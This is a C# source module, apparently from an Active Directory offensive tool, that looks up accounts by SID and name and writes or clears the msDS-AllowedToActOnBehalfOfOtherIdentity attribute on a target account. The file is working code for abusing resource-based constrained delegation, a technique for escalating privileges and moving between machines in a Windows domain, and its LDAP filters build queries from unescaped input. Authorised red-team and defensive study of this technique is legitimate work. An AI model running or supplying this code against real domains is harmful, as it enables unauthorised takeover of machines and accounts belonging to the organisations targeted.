using System;
using System.DirectoryServices;
using System.Security.AccessControl;
using System.Security.Principal;


namespace Cable.Modules
{
    public class RBCD
    {
        public static string sidToAccountLookup(string sid)
        {
            SearchResultCollection results;

            DirectoryEntry de = new DirectoryEntry();
            DirectorySearcher ds = new DirectorySearcher(de);

            string query = "(objectSid=" + sid + ")";
            ds.Filter = query;
            results = ds.FindAll();
            string account = null;

            foreach (SearchResult sr in results)
            {
                account = sr.Properties["samaccountname"][0].ToString();
            }

            return account;
        }

        public static string accountToSidLookup(string account)
        {
            SearchResultCollection results;

            DirectoryEntry de = new DirectoryEntry();
            DirectorySearcher ds = new DirectorySearcher(de);

            string query = "(samaccountname=" + account + ")";
            ds.Filter = query;
            results = ds.FindAll();
            string accountSid = null;

            foreach (SearchResult sr in results)
            {
                SecurityIdentifier sid = new SecurityIdentifier(sr.Properties["objectSid"][0] as byte[], 0);
                accountSid = sid.Value;
            }

            return accountSid;
        }

        public static void WriteRBCD(string delegate_to, string delegate_from)
        {
            string sid = accountToSidLookup(delegate_from);
            if (sid == null)
            {
                Console.WriteLine("[!] Cannot find Account to delegate from");
                return;
            }
            
            RawSecurityDescriptor rsd = new RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + sid + ")");
            Byte[] descriptor = new byte[rsd.BinaryLength];
            rsd.GetBinaryForm(descriptor, 0);

            SearchResultCollection results;

            DirectoryEntry de = new DirectoryEntry();
            DirectorySearcher ds = new DirectorySearcher(de);

            string query = "(samaccountname=" + delegate_to + ")";
            ds.Filter = query;
            results = ds.FindAll();

            if(results.Count == 0)
            {
                Console.WriteLine("[!] Cannot find account to delegate to");
                return;
            }

            try
            {
                foreach (SearchResult sr in results)
                {
                    DirectoryEntry mde = sr.GetDirectoryEntry();
                    if (sr.Properties.Contains("msds-allowedtoactonbehalfofotheridentity"))
                    {
                        Console.WriteLine("[!] This host already has a msDS-AllowedToActOnBehalfOfOtherIdentity attribute set");
                        return;
                    }
                    else
                    {
                        mde.Properties["msds-allowedtoactonbehalfofotheridentity"].Add(descriptor);
                        mde.CommitChanges();
                        Console.WriteLine($"[+] {delegate_from} SID added to msDS-AllowedToActOnBehalfOfOtherIdentity on {delegate_to}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Adding SID failed: " + ex.Message);
            }
        }

        public static void FlushRBCD(string account)
        {
            SearchResultCollection results;

            DirectoryEntry de = new DirectoryEntry();
            DirectorySearcher ds = new DirectorySearcher(de);

            string query = "(samaccountname=" + account + ")";
            ds.Filter = query;
            results = ds.FindAll();

            if (results.Count == 0)
            {
                Console.WriteLine("[!] Cannot find account");
                return;
            }

            try
            {
                foreach (SearchResult sr in results)
                {
                    if (sr.Properties.Contains("msDs-AllowedToActOnBehalfOfOtherIdentity"))
                    {
                        DirectoryEntry mde = sr.GetDirectoryEntry();
                        mde.Properties["msds-allowedtoactonbehalfofotheridentity"].Clear();
                        mde.CommitChanges();
                        Console.WriteLine($"[+] SIDs cleared from msDs-AllowedToActOnBehalfOfOtherIdentity on {account}");
                    }
                    else
                    {
                        Console.WriteLine($"[!] {account} does not have msDs-AllowedToActOnBehalfOfOtherIdentity set");
                        return;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Flushing SID failed: " + ex.Message);
            }
        }

    }
}
